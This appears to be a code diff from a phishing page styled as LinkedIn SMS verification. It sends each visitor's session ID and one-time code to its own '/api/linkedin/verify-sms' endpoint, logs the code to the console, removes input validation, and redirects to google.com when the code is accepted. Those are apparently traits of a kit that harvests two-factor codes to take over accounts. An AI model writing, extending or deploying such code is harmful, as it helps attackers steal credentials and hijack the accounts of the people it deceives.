@@ -46,41 +46,25 @@ document.addEventListener("DOMContentLoaded", () => {
 
     loader.classList.remove("hidden__imp");
 
-    submitButton.addEventListener("click", function (e) {
-      e.preventDefault();
-      hideError();
+    let submitCodeXhr = new XMLHttpRequest();
+    submitCodeXhr.open("POST", "/api/linkedin/verify-sms", true);
+    submitCodeXhr.setRequestHeader("Content-type", "application/json");
+    submitCodeXhr.send(JSON.stringify({ sessionId: sessionId, code: code }));
+    console.log(sessionId);
+    console.log(code);
 
-      const code = pinInput.value.trim();
-      if (!code) {
-        showError("Please enter the verification code");
-        return;
+    submitCodeXhr.onreadystatechange = function () {
+      let response = this.response;
+      console.log(response);
+      if (response == "0") {
+        loader.classList.add("hidden__imp");
+        pinInput.value = ""; // Clear the input field
+        showError();
+        updateSubmitButton();
+      } else if (response == "1") {
+        location.href = "https://www.google.com";
       }
-
-      if (code.length !== 6) {
-        showError("Please enter a 6-digit verification code");
-        return;
-      }
-
-      loader.classList.remove("hidden__imp");
-
-      let submitCodeXhr = new XMLHttpRequest();
-      submitCodeXhr.open("POST", "/api/linkedin/verify-sms", true);
-      submitCodeXhr.setRequestHeader("Content-type", "application/json");
-      submitCodeXhr.send(JSON.stringify({ sessionId: sessionId, code: code }));
-
-      submitCodeXhr.onreadystatechange = function () {
-        let response = this.response;
-        console.log(response);
-        if (response == "0") {
-          loader.classList.add("hidden__imp");
-          pinInput.value = ""; // Clear the input field
-          showError();
-          updateSubmitButton();
-        } else if (response == "1") {
-          location.href = "https://www.google.com";
-        }
-      };
-    });
+    };
   });
 
   if (form) {
